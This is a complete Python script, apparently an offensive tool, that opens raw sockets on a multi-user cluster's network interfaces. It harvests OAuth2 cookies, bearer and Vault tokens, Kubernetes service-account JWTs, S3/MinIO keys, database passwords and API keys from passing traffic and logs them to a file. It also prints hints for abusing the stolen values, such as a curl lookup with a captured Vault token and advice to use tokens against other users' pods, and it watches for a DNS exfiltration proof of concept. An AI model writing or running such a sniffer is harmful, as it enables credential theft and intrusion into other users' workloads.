#!/usr/bin/env python3
"""
full_sniff.py
Captures tokens, cookies, SA tokens, Vault tokens,
S3 creds, DB passwords from all interfaces
"""
import socket, struct, re, os, sys
from datetime import datetime
from collections import defaultdict

# ── Config ────────────────────────────────────────────────
INTERFACES  = ["lo", "eth0", "tunl0"]
OUTFILE     = f"sniff_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

# ── What to extract ───────────────────────────────────────
EXTRACTORS = {
    "OAUTH2_COOKIE": [
        r'_oauth2_proxy=([^;\s\r\n]{10,})',
    ],
    "BEARER_TOKEN": [
        r'[Aa]uthorization:\s*[Bb]earer\s+([^\s\r\n]{10,})',
        r'[Aa]uthorization:\s*[Tt]oken\s+([^\s\r\n]{10,})',
    ],
    "VAULT_TOKEN": [
        r'[Xx]-[Vv]ault-[Tt]oken:\s*([^\s\r\n]{10,})',
        r'"client_token"\s*:\s*"([^"]{10,})"',
        r's\.[A-Za-z0-9]{24}',  # Vault token format
    ],
    "K8S_SA_TOKEN": [
        r'[Aa]uthorization:\s*[Bb]earer\s+(eyJ[^\s\r\n]{50,})',
    ],
    "COOKIE_HEADER": [
        r'[Cc]ookie:\s*([^\r\n]{20,})',
        r'[Ss]et-[Cc]ookie:\s*([^\r\n]{20,})',
    ],
    "S3_ACCESS_KEY": [
        r'[Aa]ws-[Aa]ccess-[Kk]ey-[Ii]d[=:\s]+([A-Z0-9]{16,})',
        r'[Aa]ccess[Kk]ey[Ii][Dd][=:\s"]+([A-Za-z0-9]{16,})',
        r'X-Amz-Credential=([^/&\s]+)',
    ],
    "S3_SECRET_KEY": [
        r'[Aa]ws-[Ss]ecret[=:\s]+([A-Za-z0-9+/]{20,})',
        r'[Ss]ecret[Aa]ccess[Kk]ey[=:\s"]+([A-Za-z0-9+/]{20,})',
    ],
    "DB_PASSWORD": [
        r'[Pp]assword[=:\s"]+([^\s"&\r\n]{6,})',
        r'[Pp]asswd[=:\s"]+([^\s"&\r\n]{6,})',
        r'postgresql://[^:]+:([^@]+)@',
        r'mongodb://[^:]+:([^@]+)@',
        r'redis://:([^@]+)@',
    ],
    "KEYCLOAK_TOKEN": [
        r'"access_token"\s*:\s*"([^"]{20,})"',
        r'"refresh_token"\s*:\s*"([^"]{20,})"',
        r'"id_token"\s*:\s*"([^"]{20,})"',
    ],
    "API_KEY": [
        r'[Xx]-[Aa][Pp][Ii]-[Kk]ey:\s*([^\s\r\n]{10,})',
        r'api[_-]?key[=:\s"]+([A-Za-z0-9\-_]{16,})',
    ],
    "MINIO_CREDS": [
        r'SPARROW_OBJS_ACCESS[=:\s]+([^\s\r\n]{8,})',
        r'SPARROW_OBJS_SECRET[=:\s]+([^\s\r\n]{8,})',
        r'min-ap[0-9]+-[^\s"]+',  # MinIO URL
    ],
    "INTERNAL_URL": [
        r'https?://[a-z0-9\-]+\.(?:intra|sparrow|echonet)'
        r'[^\s\r\n"\']{5,}',
    ],
}

# Port labels for context
PORT_LABELS = {
    10443: "Jupyter-TLS",
    8080:  "VS-Code/API",
    8081:  "Jupyter",
    8200:  "Vault",
    8443:  "oauth2-proxy",
    443:   "HTTPS",
    5432:  "PostgreSQL",
    27017: "MongoDB",
    6379:  "Redis",
    9090:  "Prometheus",
    6443:  "k8s-API",
    2379:  "etcd",
    53:    "DNS",
    9000:  "MinIO",
}

# ── State ─────────────────────────────────────────────────
found    = defaultdict(set)  # type → set of unique values
sessions = {}                 # ip:port → partial data

def log(f, msg, important=False):
    ts   = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    prefix = "!!!" if important else "   "
    line = f"[{ts}] {prefix} {msg}"
    print(line)
    f.write(line + "\n")
    f.flush()

def extract_all(text, src, dst, sport, dport, f):
    """Run all extractors on payload text"""
    found_something = False

    for label, patterns in EXTRACTORS.items():
        for pattern in patterns:
            matches = re.findall(pattern, text,
                                re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    match = match[0]
                match = match.strip()
                if len(match) < 6:
                    continue
                # Deduplicate
                if match in found[label]:
                    continue
                found[label].add(match)

                sport_label = PORT_LABELS.get(sport, sport)
                dport_label = PORT_LABELS.get(dport, dport)

                log(f, f"{'─'*55}", important=True)
                log(f, f"TYPE:    {label}",
                    important=True)
                log(f, f"FLOW:    {src}:{sport_label} → "
                        f"{dst}:{dport_label}",
                    important=True)
                log(f, f"VALUE:   {match[:120]}",
                    important=True)
                found_something = True

                # Special handling per type
                if label == "K8S_SA_TOKEN":
                    # Decode JWT payload
                    try:
                        import base64, json
                        parts = match.split('.')
                        pad   = parts[1] + '=' * \
                                (4 - len(parts[1]) % 4)
                        payload = json.loads(
                            base64.b64decode(pad)
                        )
                        ns  = payload.get(
                            'kubernetes.io', {})\
                            .get('namespace', '?')
                        sa  = payload.get(
                            'kubernetes.io', {})\
                            .get('serviceaccount', {})\
                            .get('name', '?')
                        log(f, f"  → k8s SA: {ns}/{sa}",
                            important=True)
                    except:
                        pass

                if label == "VAULT_TOKEN":
                    # Try to look up token info
                    log(f, f"  → Try: curl -H "
                           f"'X-Vault-Token: {match}' "
                           f"$VAULT/v1/auth/token/lookup-self",
                        important=True)

                if label in ["OAUTH2_COOKIE",
                             "BEARER_TOKEN"]:
                    log(f, f"  → Use against port 10443 "
                           f"on other user pods!",
                        important=True)

    return found_something

def open_raw_socket(iface):
    """Open raw socket on interface"""
    try:
        s = socket.socket(
            socket.AF_PACKET,
            socket.SOCK_RAW,
            socket.htons(0x0003)
        )
        s.bind((iface, 0))
        s.settimeout(0.1)
        return s
    except Exception as e:
        print(f"  Cannot open {iface}: {e}")
        return None

def sniff_interface(iface, f, stats):
    """Process one batch of packets from interface"""
    sock = stats.get(f"sock_{iface}")
    if not sock:
        return

    try:
        raw, _ = sock.recvfrom(65535)
    except socket.timeout:
        return
    except Exception:
        return

    stats["total"] += 1

    # Skip Ethernet header
    if len(raw) < 14:
        return
    eth_type = struct.unpack("!H", raw[12:14])[0]
    if eth_type != 0x0800:
        return
    ip_data = raw[14:]

    if len(ip_data) < 20:
        return

    # Parse IP
    iph   = struct.unpack("!BBHHHBBH4s4s", ip_data[:20])
    proto = iph[6]
    src   = socket.inet_ntoa(iph[8])
    dst   = socket.inet_ntoa(iph[9])
    ihl   = (iph[0] & 0xF) * 4
    rest  = ip_data[ihl:]

    # ── TCP ───────────────────────────────────────────────
    if proto == 6 and len(rest) >= 20:
        tcph   = struct.unpack("!HHLLBBHHH", rest[:20])
        sport  = tcph[0]
        dport  = tcph[1]
        offset = (tcph[4] >> 4) * 4
        payload = rest[offset:]

        if not payload:
            return

        # Reassemble partial HTTP (session tracking)
        sess_key = f"{src}:{sport}-{dst}:{dport}"
        try:
            text = payload.decode("utf-8", errors="replace")
        except:
            return

        # Buffer partial HTTP
        if sess_key in sessions:
            sessions[sess_key] += text
            text = sessions[sess_key]
            if len(text) > 8192:
                del sessions[sess_key]
        elif any(text.startswith(m) for m in [
            "GET ", "POST ", "PUT ", "DELETE ",
            "PATCH ", "HTTP/", "OPTIONS "
        ]):
            sessions[sess_key] = text

        if extract_all(text, src, dst,
                       sport, dport, f):
            stats["hits"] += 1

    # ── UDP/DNS ───────────────────────────────────────────
    elif proto == 17 and len(rest) >= 8:
        sport = struct.unpack("!H", rest[:2])[0]
        dport = struct.unpack("!H", rest[2:4])[0]
        payload = rest[8:]

        if sport == 53 or dport == 53:
            try:
                text = payload.decode(
                    "utf-8", errors="replace"
                )
                # DNS queries with encoded data
                # (our exfil PoC goes through here)
                domains = re.findall(
                    r'([a-zA-Z0-9+/=]{20,}\.'
                    r'[a-z0-9\-\.]{5,})',
                    text
                )
                for d in domains:
                    if d not in found["DNS_EXFIL"]:
                        found["DNS_EXFIL"].add(d)
                        log(f, f"DNS QUERY: {d}")
            except:
                pass


def main():
    print(f"[*] Full cluster sniffer")
    print(f"[*] Output: {OUTFILE}")
    print(f"[*] Interfaces: {INTERFACES}")
    print(f"[*] Ctrl+C to stop and see summary\n")

    # Check root
    if os.geteuid() != 0:
        # Try via unshare
        print("Not root — trying unshare...")
        os.execvp("unshare", [
            "unshare", "--user", "--map-root-user",
            "--", sys.executable
        ] + sys.argv)

    stats = {"total": 0, "hits": 0}

    with open(OUTFILE, "w") as f:
        log(f, f"Sniffer started: {datetime.now()}")
        log(f, f"Interfaces: {INTERFACES}")
        log(f, f"Extractors: {list(EXTRACTORS.keys())}\n")

        # Open all sockets
        for iface in INTERFACES:
            sock = open_raw_socket(iface)
            if sock:
                stats[f"sock_{iface}"] = sock
                log(f, f"Listening on {iface}")

        # Round-robin across all interfaces
        try:
            while True:
                for iface in INTERFACES:
                    sniff_interface(iface, f, stats)

                # Print stats every 10k packets
                if stats["total"] % 10000 == 0 \
                   and stats["total"] > 0:
                    log(f, f"[stats] {stats['total']} "
                           f"packets, "
                           f"{stats['hits']} hits")

        except KeyboardInterrupt:
            pass

        # ── Final summary ─────────────────────────────────
        print(f"\n{'='*60}")
        print(f"CAPTURE SUMMARY")
        print(f"{'='*60}")
        f.write(f"\n{'='*60}\nSUMMARY\n{'='*60}\n")

        for label, values in found.items():
            if not values:
                continue
            summary = (f"\n[{label}] "
                       f"{len(values)} unique values:")
            print(summary)
            f.write(summary + "\n")
            for v in values:
                line = f"  {v[:120]}"
                print(line)
                f.write(line + "\n")

        print(f"\n[*] Total packets: {stats['total']}")
        print(f"[*] Total hits:    {stats['hits']}")
        print(f"[*] Saved to:      {OUTFILE}")

if __name__ == "__main__":
    main()
